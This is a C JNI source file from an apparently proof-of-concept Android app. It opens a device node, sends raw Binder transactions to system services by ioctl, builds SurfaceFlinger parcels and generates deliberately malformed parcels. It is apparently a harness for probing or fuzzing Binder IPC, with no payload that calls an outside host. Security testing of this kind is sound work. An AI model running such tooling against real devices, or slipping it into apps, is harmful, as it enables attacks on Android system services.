#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/types.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

jbyteArray Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv*, jclass, jint, jint, jint, jint, jbyteArray);

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return -1;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return -1;
    int fd = open(cpath, O_RDWR);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        return -errno;
    }
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    return fd;
}

JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv* env, jclass clazz,
                                                             jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    uint8_t* tx_data = NULL;
    size_t tx_data_size = 0;
    if (data != NULL) {
        tx_data_size = (*env)->GetArrayLength(env, data);
        tx_data = malloc(tx_data_size);
        if (tx_data == NULL) {
            LOGE("malloc failed");
            return NULL;
        }
        (*env)->GetByteArrayRegion(env, data, 0, tx_data_size, (jbyte*)tx_data);
    }

    size_t cmd_size = sizeof(uint32_t) + sizeof(struct binder_transaction_data);
    size_t total_size = cmd_size + tx_data_size;
    uint8_t* buf = malloc(total_size);
    if (buf == NULL) {
        if (tx_data) free(tx_data);
        LOGE("malloc for buffer failed");
        return NULL;
    }

    uint32_t* cmd = (uint32_t*)buf;
    *cmd = BC_TRANSACTION;
    struct binder_transaction_data* tdata = (struct binder_transaction_data*)(buf + sizeof(uint32_t));
    memset(tdata, 0, sizeof(struct binder_transaction_data));
    tdata->target.handle = (uint32_t)handle;
    tdata->code = (uint32_t)code;
    tdata->flags = (uint32_t)flags;
    tdata->data_size = tx_data_size;
    tdata->offsets_size = 0;
    tdata->data.ptr.buffer = (binder_uintptr_t)(buf + cmd_size);
    tdata->data.ptr.offsets = 0;

    if (tx_data_size > 0 && tx_data != NULL) {
        memcpy(buf + cmd_size, tx_data, tx_data_size);
    }

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = total_size;
    bwr.write_buffer = (binder_uintptr_t)buf;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);

    if (tx_data) free(tx_data);
    free(buf);

    if (ret < 0) {
        LOGE("ioctl failed: %s (handle=%d, code=%d, data_size=%zu)",
             strerror(errno), handle, code, tx_data_size);
        return NULL;
    }
    if (bwr.read_consumed == 0) {
        return NULL;
    }

    jbyteArray result = (*env)->NewByteArray(env, bwr.read_consumed);
    (*env)->SetByteArrayRegion(env, result, 0, bwr.read_consumed, (jbyte*)read_buf);
    return result;
}

JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderGetService(JNIEnv* env, jclass clazz,
                                                             jint fd, jstring serviceName, jstring descriptor) {
    if (serviceName == NULL || descriptor == NULL) return NULL;

    const char* desc = (*env)->GetStringUTFChars(env, descriptor, NULL);
    if (desc == NULL) return NULL;

    size_t len = strlen(desc) + 1;
    size_t total_len = 4 + len;

    uint8_t* data = malloc(total_len);
    if (data == NULL) {
        (*env)->ReleaseStringUTFChars(env, descriptor, desc);
        LOGE("malloc failed");
        return NULL;
    }

    data[0] = (uint8_t)(len & 0xFF);
    data[1] = (uint8_t)((len >> 8) & 0xFF);
    data[2] = (uint8_t)((len >> 16) & 0xFF);
    data[3] = (uint8_t)((len >> 24) & 0xFF);
    memcpy(data + 4, desc, len);

    (*env)->ReleaseStringUTFChars(env, descriptor, desc);

    jbyteArray jdata = (*env)->NewByteArray(env, total_len);
    (*env)->SetByteArrayRegion(env, jdata, 0, total_len, (jbyte*)data);
    free(data);

    jbyteArray reply = Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(
            env, clazz, fd, 0, 1, 0, jdata);
    (*env)->DeleteLocalRef(env, jdata);
    return reply;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderDumpReply(JNIEnv* env, jclass clazz,
                                                           jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    jbyteArray reply = Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(
            env, clazz, fd, handle, code, flags, data);
    char result[256] = {0};
    if (reply != NULL) {
        jsize len = (*env)->GetArrayLength(env, reply);
        uint8_t* buf = malloc(len + 1);
        if (buf) {
            (*env)->GetByteArrayRegion(env, reply, 0, len, (jbyte*)buf);
            buf[len] = '\0';
            if (len <= 32) {
                char hex[128] = {0};
                int pos = 0;
                for (int i = 0; i < len && i < 32; i++) {
                    pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
                }
                snprintf(result, sizeof(result), "len=%d hex: %s", len, hex);
            } else {
                snprintf(result, sizeof(result), "len=%d", len);
            }
            free(buf);
        } else {
            snprintf(result, sizeof(result), "len=%d", len);
        }
        (*env)->DeleteLocalRef(env, reply);
    } else {
        snprintf(result, sizeof(result), "ERROR: no reply or ioctl failed");
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderWriteToService(JNIEnv* env, jclass clazz,
                                                                jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    uint8_t* tx_data = NULL;
    size_t tx_data_size = 0;
    if (data != NULL) {
        tx_data_size = (*env)->GetArrayLength(env, data);
        tx_data = malloc(tx_data_size);
        if (tx_data == NULL) {
            LOGE("malloc failed");
            return -ENOMEM;
        }
        (*env)->GetByteArrayRegion(env, data, 0, tx_data_size, (jbyte*)tx_data);
    }

    size_t cmd_size = sizeof(uint32_t) + sizeof(struct binder_transaction_data);
    size_t total_size = cmd_size + tx_data_size;
    uint8_t* buf = malloc(total_size);
    if (buf == NULL) {
        if (tx_data) free(tx_data);
        LOGE("malloc for buffer failed");
        return -ENOMEM;
    }

    uint32_t* cmd = (uint32_t*)buf;
    *cmd = BC_TRANSACTION;
    struct binder_transaction_data* tdata = (struct binder_transaction_data*)(buf + sizeof(uint32_t));
    memset(tdata, 0, sizeof(struct binder_transaction_data));
    tdata->target.handle = (uint32_t)handle;
    tdata->code = (uint32_t)code;
    tdata->flags = (uint32_t)flags;
    tdata->data_size = tx_data_size;
    tdata->offsets_size = 0;
    tdata->data.ptr.buffer = (binder_uintptr_t)(buf + cmd_size);
    tdata->data.ptr.offsets = 0;

    if (tx_data_size > 0 && tx_data != NULL) {
        memcpy(buf + cmd_size, tx_data, tx_data_size);
    }

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = total_size;
    bwr.write_buffer = (binder_uintptr_t)buf;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);

    if (tx_data) free(tx_data);
    free(buf);

    if (ret < 0) {
        LOGE("ioctl write failed: %s", strerror(errno));
        return -errno;
    }
    return bwr.write_consumed;
}

JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBuildSurfaceFlingerParcel(JNIEnv* env, jclass clazz,
                                                                     jint displayId, jint layerId, jint what,
                                                                     jint x, jint y, jint w, jint h) {
    uint8_t* data = malloc(32);
    if (data == NULL) return NULL;

    memset(data, 0, 32);
    memcpy(data, &displayId, 4);
    memcpy(data + 4, &layerId, 4);
    memcpy(data + 8, &what, 4);
    memcpy(data + 12, &x, 4);
    memcpy(data + 16, &y, 4);
    memcpy(data + 20, &w, 4);
    memcpy(data + 24, &h, 4);

    jbyteArray result = (*env)->NewByteArray(env, 32);
    (*env)->SetByteArrayRegion(env, result, 0, 32, (jbyte*)data);
    free(data);
    return result;
}

JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBuildMalformedParcel(JNIEnv* env, jclass clazz, jint size, jint offsetCount) {
    if (size <= 0) size = 128;
    if (offsetCount <= 0) offsetCount = 1;

    int total = size + (offsetCount * 4);
    uint8_t* data = malloc(total);
    if (data == NULL) return NULL;

    memset(data, 0, total);
    for (int i = 0; i < size && i < total; i++) {
        data[i] = (uint8_t)(i & 0xFF);
    }

    for (int i = 0; i < offsetCount; i++) {
        int off = size + (i * 4);
        int val = (i * 8) % size;
        memcpy(data + off, &val, 4);
    }

    jbyteArray result = (*env)->NewByteArray(env, total);
    (*env)->SetByteArrayRegion(env, result, 0, total, (jbyte*)data);
    free(data);
    return result;
}
